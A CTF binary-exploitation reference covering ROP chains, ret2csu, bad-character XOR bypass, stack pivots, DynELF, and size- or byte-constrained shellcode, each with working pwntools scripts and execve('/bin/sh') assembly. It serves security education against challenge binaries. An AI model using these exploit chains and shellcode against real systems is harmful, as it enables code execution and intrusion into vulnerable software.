# CTF Pwn - ROP Chains and Shellcode

For double stack pivot, SROP with UTF-8 constraints, RETF architecture switch, seccomp bypass, .fini_array hijack, ret2vdso, pwntools template, and shellcode with input reversal, see [rop-advanced.md](rop-advanced.md).

---

## ROP Chain Building

```python
from pwn import *
elf, libc = ELF('./binary'), ELF('./libc.so.6')
rop = ROP(elf)
pop_rdi, ret = rop.find_gadget(['pop rdi', 'ret'])[0], rop.find_gadget(['ret'])[0]
payload = flat(b'A' * offset, pop_rdi, elf.got['puts'], elf.plt['puts'], RET2)
```

**The return target after the leak decides whether stage 2 survives.** Return to the `call vuln` instruction inside `main`: the CALL pushes a valid return address and rebuilds the frame exactly as on the first pass. `main`'s entry re-runs init/`check_status` and can reset state the exploit already consumed; entering `vuln` directly leaves `rsp` misaligned for the next libc call.

**Leak without a trailing newline.** When `printf` omits the trailing newline, the leaked bytes land straight after the text, so `recvline` reads them glued to the prefix - take a fixed width instead:

```python
io.recvuntil(b'Laundry complete')
leak = u64(io.recv(6).ljust(8, b'\x00'))
```

### Raw Syscall ROP (When system() Fails)

When a libc call crashes under CET/IBT or bad alignment, end the chain through the `syscall` instruction: `pop rax` = 59, `pop rdi` = `"/bin/sh"`, `pop rsi` = 0, `pop rdx; pop rbx; ret` (plain `pop rdx; ret` is rare in modern libc), then `syscall; ret`. It skips every libc prologue and is the most reliable ending.

### rdx Control in ROP Chains

`puts` and friends clobber `rdx` to a small value, breaking a following `read(fd, buf, rdx)`. Three fixes: a `pop rdx; pop rbx; ret` gadget from libc; re-entering the binary's own `read` setup (`lea rax,[rbp-0x40]; mov edx,0x100; mov rsi,rax; ...`) after setting `rbp` with `pop rbp; ret` - the `leave;ret` after that read pivots `rsp` to `rbp`, so put the next chain at `rbp+8`; or use that `leave;ret` as a deliberate pivot.

### Shell Interaction After execve

The shell inherits stdin, so commands sent immediately can be eaten by a pending `read`. Sleep ~1s after the payload, then `sendline` one command at a time and `recv` with a timeout - do not batch-pipe.

## ret2csu — `__libc_csu_init` Gadgets

Two gadgets: the pop chain (`pop rbx; pop rbp; pop r12; pop r13; pop r14; pop r15; ret`) and the mover (`mov rdx, r15; mov rsi, r14; mov edi, r13d; call [r12 + rbx*8]; add rbx,1; cmp rbp,rbx; jne`). Set `rbx = 0`, `rbp = 1`, and `r12` to a *memory* slot holding the target address (a GOT entry, or a pointer array in `.bss`) - `r12` is dereferenced, never called directly.

Two traps decide the payload:

- **`edi` is 32-bit.** `mov edi, r13d` zero-extends, so a libc address as the first argument needs a real `pop rdi; ret`.
- **The call returns into the pop chain**, so the seven qwords after `call` are consumed as `rbx/rbp/r12-r15` plus a return - pad 56 bytes before the next gadget.

---

## Bad Character Bypass via XOR Encoding in ROP (Crypto-Cat)

**When to use:** ROP payload must write data (e.g., `"/bin/sh"` or `"flag.txt"`) to memory, but certain bytes are forbidden (null bytes, newlines, spaces, etc.).

**Strategy:** XOR each chunk of data with a known key, write the XOR'd value to `.data` section, then XOR it back in place using gadgets from the binary.

**Required gadgets:**
```asm
pop r14; pop r15; ret          ; load XOR key (r14) and target address (r15)
xor [r15], r14; ret            ; XOR memory at r15 with r14
mov [r15], r14; ret            ; write r14 to memory at r15 (initial write)
```

**Exploit pattern:**
```python
data_section = elf.symbols['__data_start']  # or .data address
xor_key = 2  # simple key that removes bad chars

def xor_bytes(data, key):
    return bytes(b ^ key for b in data)

target = b"flag.txt"
encoded = xor_bytes(target, xor_key)

payload = b'A' * offset

# Write XOR'd data in 8-byte chunks
for i in range(0, len(encoded), 8):
    chunk = encoded[i:i+8].ljust(8, b'\x00')
    payload += flat(
        pop_r14_r15,
        chunk,                    # XOR'd data
        data_section + i,         # destination address
        mov_r15_r14,              # write to memory
    )

# XOR each chunk back to recover original
for i in range(0, len(target), 8):
    payload += flat(
        pop_r14_r15,
        p64(xor_key),             # XOR key
        data_section + i,         # target address
        xor_r15_r14,              # decode in place
    )

# Now data_section contains "flag.txt" — use it as argument
payload += flat(pop_rdi, data_section, elf.plt['print_file'])
```

**Key insight:** XOR is self-inverse (`a ^ k ^ k = a`). Choose a key that transforms all forbidden bytes into allowed ones. For simple cases, XOR with `2` or `0x41` works. For complex restrictions, solve per-byte: for each position, find any key byte where `original ^ key` avoids all bad characters.

---

## Exotic x86 Gadgets — BEXTR/XLAT/STOSB/PEXT (Crypto-Cat)

**When to use:** Standard `mov [reg], reg` write gadgets don't exist in the binary. Look for obscure x86 instructions that can be chained for byte-by-byte memory writes.

### 64-bit: BEXTR + XLAT + STOSB

**BEXTR** (Bit Field Extract) extracts bits from a source register. **XLAT** translates a byte via table lookup (`al = [rbx + al]`). **STOSB** stores `al` to `[rdi]` and increments `rdi`.

```python
# Gadgets from questionableGadgets section of binary
xlat_ret = elf.symbols.questionableGadgets          # xlat byte ptr [rbx]; ret
bextr_ret = elf.symbols.questionableGadgets + 2     # pop rdx; pop rcx; add rcx, 0x3ef2;
                                                     # bextr rbx, rcx, rdx; ret
stosb_ret = elf.symbols.questionableGadgets + 17    # stosb byte ptr [rdi], al; ret

data_section = elf.symbols.__data_start

# Write "flag.txt" byte by byte
for i, char in enumerate(b"flag.txt"):
    # Find address of char in binary's read-only data
    char_addr = next(elf.search(bytes([char])))

    # BEXTR extracts rbx from rcx using rdx as control
    # rcx = char_addr - 0x3ef2 (compensate for add)
    # rdx = 0x4000 (extract 64 bits starting at bit 0)
    payload += flat(
        bextr_ret,
        0x4000,                    # rdx (BEXTR control: start=0, len=64)
        char_addr - 0x3ef2,        # rcx (offset compensated)
        xlat_ret,                  # al = byte at [rbx + al]
        pop_rdi,
        data_section + i,
        stosb_ret,                 # [rdi] = al; rdi++
    )
```

### 32-bit: PEXT (Parallel Bits Extract)

**PEXT** selects bits from a source using a mask and packs them contiguously. Combined with BSWAP and XCHG for byte-level writes.

```python
# Gadgets
pext_ret = elf.symbols.questionableGadgets           # mov eax,ebp; mov ebx,0xb0bababa;
                                                      # pext edx,ebx,eax; ...ret
bswap_ret = elf.symbols.questionableGadgets + 21     # pop ecx; bswap ecx; ret
xchg_ret = elf.symbols.questionableGadgets + 18      # xchg byte ptr [ecx], dl; ret

# For each target byte, compute mask so that PEXT(0xb0bababa, mask) = target_byte
def find_mask(target_byte, source=0xb0bababa):
    """Find 32-bit mask that extracts target_byte from source via PEXT."""
    source_bits = [(source >> i) & 1 for i in range(32)]
    target_bits = [(target_byte >> i) & 1 for i in range(8)]
    # Select 8 bits from source that match target bits
    mask = 0
    matched = 0
    for i in range(32):
        if matched < 8 and source_bits[i] == target_bits[matched]:
            mask |= (1 << i)
            matched += 1
    return mask if matched == 8 else None
```

**Key insight:** When a binary lacks standard write gadgets, exotic instructions (BEXTR, PEXT, XLAT, STOSB, BSWAP, XCHG) can be chained for the same effect. Check `questionableGadgets` or similar labeled sections in challenge binaries.

---

## Stack Pivot via xchg rax,esp (Crypto-Cat)

**When to use:** Buffer is too small for the full ROP chain, but the program leaks a heap/stack address where a larger buffer has been prepared.

**Two-stage pattern:**
```python
# Stage 1: Program provides a heap address where it wrote user data
pivot_addr = int(io.recvline(), 16)

# Prepare ROP chain at the pivot address (via earlier input)
stage2_rop = flat(
    pop_rdi, elf.got['puts'],
    elf.plt['puts'],             # leak libc
    elf.symbols['main'],         # return to main for stage 3
)
io.send(stage2_rop)             # Written to pivot_addr by program

# Stage 2: Overflow with stack pivot
xchg_rax_esp = elf.symbols.usefulGadgets + 2  # xchg rax, esp; ret
pop_rax = elf.symbols.usefulGadgets            # pop rax; ret

payload = flat(
    b'A' * offset,
    pop_rax,
    pivot_addr,         # load pivot address into rax
    xchg_rax_esp,       # swap rax ↔ esp → stack now points to stage2_rop
)
```

**Why xchg vs. leave;ret:**
- `leave; ret` sets `rsp = rbp` — requires controlling `rbp` (often possible via overflow)
- `xchg rax, esp` swaps directly — requires controlling `rax` (via `pop rax; ret`)
- `xchg` works even when `rbp` is not on the stack (e.g., small buffer overflow)

**Limitation:** `xchg rax, esp` truncates to 32-bit on x86-64 (sets upper 32 bits of rsp to 0). The pivot address must be in the lower 4GB of address space. Heap and mmap regions often qualify; stack addresses (0x7fff...) do not.

---

## sprintf() Gadget Chaining for Bad Character Bypass (PlaidCTF 2013)

**Pattern:** When shellcode contains bytes filtered by the input handler (null, space, slash, colon, etc.), use `sprintf()` to copy individual bytes from the executable's own memory — one byte at a time — to assemble clean shellcode on BSS.

```python
from pwn import *

# Step 1: Scan executable for addresses containing each needed byte
exe_data = open('binary', 'rb').read()
byte_addrs = {}  # Maps byte value -> address in executable
for c in range(256):
    for i in range(len(exe_data)):
        addr = exe_base + i
        if exe_data[i] == c and not has_bad_chars(p32(addr)):
            byte_addrs[c] = addr
            break

# Step 2: Chain sprintf(bss_dest, byte_addr) for each shellcode byte
rop = b''
for i, byte in enumerate(shellcode):
    rop += p32(sprintf_plt)
    rop += p32(pop3ret)           # Clean 3 args
    rop += p32(bss_addr + i)     # Destination
    rop += p32(byte_addrs[byte]) # Source (1 byte + null terminator)
    rop += p32(0)                # Unused arg

# Step 3: Jump to assembled shellcode on BSS
rop += p32(bss_addr)
```

**Key insight:** `sprintf(dst, src)` copies bytes until a null terminator — effectively a single-byte copy when `src` points to a byte followed by `\x00`. Each call in the ROP chain places one shellcode byte. The source addresses come from the binary's own `.text`/`.rodata` sections. Requires a `pop3ret` gadget for stack cleanup between calls.

---

## DynELF Automated Libc Discovery (RC3 CTF 2016)

When the remote libc version is unknown, use pwntools' `DynELF` to resolve function addresses at runtime by leaking memory through a format string or read primitive.

```python
from pwn import *

elf = ELF('./target')
io = remote('target.ctf', 1337)

# Define a leak function that reads memory at a given address
def leak(addr):
    payload = b'A' * offset
    payload += p64(elf.plt['printf'])  # call printf to leak
    payload += p64(main_addr)          # return to main for next leak
    payload += p64(addr)               # argument: address to read
    io.sendline(payload)
    data = io.recvuntil(b'prompt', drop=True)
    return data

# DynELF resolves symbols by parsing ELF structures in memory
d = DynELF(leak, elf=elf)
system_addr = d.lookup('system', 'libc')
binsh_addr = d.lookup(None, 'libc')  # search for "/bin/sh" string

log.success(f"system @ {hex(system_addr)}")

# Build final ROP chain with resolved addresses
payload = b'A' * offset
payload += p64(pop_rdi_ret)
payload += p64(binsh_addr)
payload += p64(system_addr)
io.sendline(payload)
io.interactive()
```

**Key insight:** DynELF parses the remote ELF's `.dynamic` section, link map, and symbol tables to resolve any libc function without knowing the libc version. Requires a reliable memory read primitive (leak function) that can read arbitrary addresses.

---

## Constrained Shellcode in Small Buffers (TUM CTF 2016)

When shellcode space is severely limited (e.g., 15-16 bytes due to AES block size), use minimal register setup and avoid unnecessary instructions.

```asm
; 15-byte execve("/bin/sh") shellcode for x86-64
; Assumes: rsp points to writable area, "/bin/sh\0" follows shellcode on stack
; Written in fasm syntax:

lea rdi, [rsp + 0x19]    ; 4 bytes - pointer to "/bin/sh" on stack
cdq                       ; 1 byte  - rdx = 0 (envp = NULL)
push rdx                  ; 1 byte  - NULL terminator for argv
push rdi                  ; 1 byte  - argv[0] = "/bin/sh"
push rsp                  ; 1 byte
pop rsi                   ; 1 byte  - rsi = argv = {"/bin/sh", NULL}
push 0x3b                 ; 2 bytes - syscall number for execve
pop rax                   ; 1 byte  - rax = 59
syscall                   ; 2 bytes - execve("/bin/sh", argv, NULL)
; Total: 15 bytes

; When AES-CBC is involved, craft IV to XOR-decrypt shellcode block:
; crafted_iv = AES_decrypt(known_ciphertext) XOR shellcode
```

**Key insight:** The `cdq` instruction (1 byte) zero-extends eax into edx, and `push reg; pop reg` pairs (2 bytes) replace `mov` (3 bytes). For AES-block-constrained shellcode, compute the IV that decrypts to your shellcode by XORing `AES_decrypt(ciphertext_block)` with the desired shellcode.

---

## Stack Canary XOR Epilogue as RDX Zeroing Gadget (VolgaCTF 2017)

**When to use:** Need `rdx = 0` for `execve(path, argv, NULL)` but no `pop rdx; ret` gadget exists in the binary. The canary verification epilogue `xor rdx, fs:28h` zeros RDX when the canary is intact.

```python
from pwn import *

# Canary check epilogue (found in most binaries):
# mov rdx, [rsp+8]    ; load canary from stack
# xor rdx, fs:28h     ; XOR with stored canary → 0 if intact
# Jump into this code as a "gadget" to zero RDX

# Find the canary check sequence in the binary
canary_xor_gadget = next(binary.search(asm(
    "mov rdx, [rsp+8]; xor rdx, qword ptr fs:[0x28]"
)))
# Side effect: harmless write of je result, rdx = 0 for execve(path, argv, NULL)

# Use in ROP chain:
rop = flat(
    pop_rdi, binsh_addr,          # rdi = "/bin/sh"
    pop_rsi, 0,                   # rsi = NULL (argv)
    canary_xor_gadget,            # rdx = canary ^ fs:28h = 0
    execve_addr,                  # execve("/bin/sh", NULL, NULL)
)
```

**Key insight:** The stack canary check `xor rdx, fs:28h` produces `rdx=0` when the canary is correct. Jump into this epilogue as a gadget when `pop rdx` is unavailable -- it provides a reliable zero-rdx primitive with only a benign byte-write side effect. This works because the canary on the stack matches `fs:28h`, so the XOR result is always zero in a non-corrupted frame.

**When to recognize:** ROP chain needs `rdx=0` (common for `execve` third argument) but the binary lacks `pop rdx; ret` or `pop rdx; pop rbx; ret`. Search for `xor rdx, qword ptr fs:` in the binary's disassembly -- it appears in every function with a stack canary.

**References:** VolgaCTF 2017

---

## Minimal Shellcode with Pre-Initialized Registers (Square CTF 2017)

**Pattern:** When the shellcode entry point has registers already initialized to useful values (e.g., `eax=4` for the `write` syscall on x86-32, `ebx=1` for stdout), exploit them to dramatically reduce shellcode size. Always audit register state at entry before writing shellcode from scratch.

**Example (x86-32 write syscall, entry: eax=4, ebx=1):**
```asm
; Entry state: eax=4 (sys_write), ebx=1 (stdout fd)
; Goal: write flag buffer to stdout — only need ecx and edx

; 3-byte: point ecx at the flag buffer
lea ecx, [edi + flag_offset]   ; 3 bytes (if offset fits in 1 byte)

; 2-byte: set edx (byte count)
mov dl, 64                      ; 2 bytes

; 2-byte: trigger syscall
int 0x80                        ; 2 bytes

; Total: 7 bytes — or as few as 5 if edx is already set
```

**Workflow:**
```python
# 1. Run the binary in gdb, break right before shellcode is executed
# 2. Inspect all registers: info registers
# 3. Identify which syscall arguments are already set
# 4. Write only the instructions needed to fill missing arguments

# Useful pre-initialized patterns:
# - eax = syscall number already set by caller
# - ebx = fd (stdin=0, stdout=1) from prior open/setup
# - rdi, rsi from calling convention leakage
# - rsp pointing into a writable region (for push-based addressing)
```

**Key insight:** Always audit entry register values before writing shellcode — pre-loaded syscall numbers and fd values can reduce shellcode to under 6 bytes. The smallest possible shellcode exploits the ABI calling convention residue left by the surrounding code.

**References:** Square CTF 2017

---

## Unique-Byte Shellcode via syscall RIP to RCX (HITCON 2017)

**Pattern:** x86-64 `syscall` instruction saves `RIP` (next instruction address) into `RCX` as a side effect. An 8-byte stager exploits this: execute `syscall` (which also triggers a `read` with pre-set registers), then use `rcx` (now = address of the instruction after `syscall`) as the address for reading the full shellcode to the same RWX location. All 8 bytes of the stager must be unique (no repeated bytes).

**8-byte stager construction:**
```asm
; Entry constraints: rax=0 (read), rdi=0 (stdin), rsi=shellcode_buf, rdx=8 (small)
; Side effect of syscall: rcx = RIP (address of next instruction after syscall)

syscall          ; 2 bytes: 0f 05 — executes read(0, shellcode_buf, 8)
                 ;           and sets rcx = &next_instr (= shellcode_buf + 2)
push rcx         ; 1 byte:  51 — stack = [shellcode_buf + 2]
pop rsi          ; 1 byte:  5e — rsi = shellcode_buf + 2 (where full shellcode goes)
xor edx, edx     ; 2 bytes: 31 d2 — clear rdx
mov dl, 100      ; 2 bytes: b2 64 — rdx = 100 (read size for stage 2)
; Back to syscall (loop): the push/pop sequence ends up jumping to syscall again
; ... or arrange entry so the next syscall reads 100 bytes to rsi
```

**Uniqueness constraint:**
```python
# All 8 bytes must be distinct (challenge-specific filter)
# Candidate sequence: 0f 05 51 5e 31 d2 b2 64  — all unique
# Verify: len(set(bytes)) == len(bytes)
stager = bytes([0x0f, 0x05, 0x51, 0x5e, 0x31, 0xd2, 0xb2, 0x64])
assert len(set(stager)) == len(stager)  # passes

# Stage 2: full execve shellcode sent to stdin after stager runs first syscall
from pwn import *
p.send(stager)
p.send(asm(shellcraft.sh()))
```

**Key insight:** x86-64 `syscall` copies RIP to RCX — weaponize this as position-independent address discovery for tiny shellcode stagers. The stager needs no hardcoded addresses: it calculates its own location via the `syscall` side effect, then uses that address as the destination for reading the full payload.

**References:** HITCON CTF 2017

---

## stub_execveat Syscall as execve Alternative (ASIS CTF 2018)

**Pattern:** In a tiny binary with only `read` syscall and no `pop rax` gadget, use `stub_execveat` (syscall 0x142/322) instead of `execve` (0x3b). Since `read()` returns bytes-read in `rax`, make total input length exactly 0x142 bytes so `rax=0x142` when the syscall gadget fires.

**Why this works:**
1. The binary is tiny -- only `read` and basic gadgets, no `pop rax; ret`
2. `execve` requires `rax=0x3b` (59), but without `pop rax` there's no way to set it
3. `read()` returns the number of bytes read in `rax` -- this is the only rax control
4. `stub_execveat` (syscall 322 = 0x142) accepts the same arguments as `execve` when `AT_FDCWD` is used for the directory fd
5. Send exactly 0x142 bytes so `read()` returns 0x142, then hit `syscall`

```python
from pwn import *

# Binary gadgets (tiny static binary)
xor_rdx_syscall = 0x4000ed   # xor rdx, rdx; syscall
syscall_gadget  = 0x400101   # syscall

# Build payload: /bin/sh string + padding + ROP chain
# Total length must be exactly 0x142 bytes
payload  = b"/bin/sh\x00"                          # rdi points here
payload += b"B" * (0x148 - (8*4) - 8)              # padding to ROP area
payload += p64(xor_rdx_syscall)                     # xor rdx, rdx; syscall
payload += p64(syscall_gadget)                      # syscall (rax=0x142 from read)
payload += b"A" * (0x142 - len(payload) - 1)        # pad to exactly 0x142 bytes
# rax = 0x142 from read() return value = stub_execveat syscall number

io = remote('target', 1337)
io.send(payload)
io.interactive()
```

**Key insight:** `stub_execveat` (syscall 322/0x142) accepts the same arguments as execve when `AT_FDCWD` is used, but its higher syscall number can be reached via `read()` return value when `pop rax; ret` gadgets are unavailable. Always check if alternative syscalls with equivalent functionality have numbers reachable through return values or other implicit register control.

**References:** ASIS CTF 2018

---

## Alphanumeric Shellcode Bootstrap via push/pop When rax=0 (nullcon HackIM 2019)

**Pattern (easy-shell):** RWX page receives attacker shellcode but every byte must be alphanumeric (`[0-9A-Za-z]`). Tools like [basic-amd64-alphanumeric-shellcode-encoder](https://github.com/veritas501/basic-amd64-alphanumeric-shellcode-encoder) emit self-decoding stubs but require `rax + padding_len == shellcode_address` at entry. When the harness enters with `rax = 0` (not anywhere near the shellcode) the encoder has nothing to land on. Prepend a tiny 3-byte non-alnum-but-accepted seed — `push r12; pop rax` — so `rax` becomes a live stack/code pointer, then call the encoder with `padding_len=3`.

```python
from pwn import *
context(arch='amd64')

file_name = "flag".ljust(8, '\x00')
sc = '''
    mov rax, %s
    push rax
    mov rdi, rsp
    mov rax, 2          /* open(rsp, 0) */
    mov rsi, 0
    syscall
    mov rdi, rax
    sub rsp, 0x20
    mov rsi, rsp
    mov rdx, 0x20
    mov rax, 0          /* read(fd, rsp, 0x20) */
    syscall
    mov rdi, 0
    mov rsi, rsp
    mov rdx, 0x20
    mov rax, 1          /* write(1, rsp, 0x20) */
    syscall
''' % hex(u64(file_name))
sc = asm(sc)

# push r12 (0x41 0x54) + pop rax (0x58) = 3 bytes, all happen to be alnum-safe
bootstrap = asm("push r12; pop rax;")
payload = bootstrap + alphanum_encoder(sc, 3)
```

**Key insight:** Alphanumeric-only decoders typically need `rax` to point at (or a fixed offset before) the payload. If the harness zeroes `rax`, seed it from *any* volatile register that already holds a valid address — `r12` is routinely `_start` on Linux, and `push r12; pop rax` happens to be `AT X` (0x41 0x54 0x58), which the encoder's input filter treats as benign. Adjust the encoder's `padding_len` argument to exactly match the prepended byte count so the decode math still lines up.

**References:** nullcon HackIM 2019 — easy-shell, writeups 13048, 13203
